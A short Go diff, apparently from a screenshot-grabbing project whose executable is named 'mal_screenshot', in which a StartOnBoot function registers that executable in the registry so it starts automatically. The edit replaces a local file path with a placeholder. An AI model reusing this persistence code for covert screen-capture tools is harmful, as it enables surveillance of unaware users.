@@ -81,7 +81,7 @@ func StartOnBoot() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	if err := k.SetStringValue("mal_screenshot", "C:\\Users\\troot\\Documents\\vs_code\\grab_screenshot\\mal_screenshot.exe"); err != nil {
+	if err := k.SetStringValue("mal_screenshot", "<Executable file path>"); err != nil {
 		log.Fatal(err)
 	}
 	if err := k.Close(); err != nil {
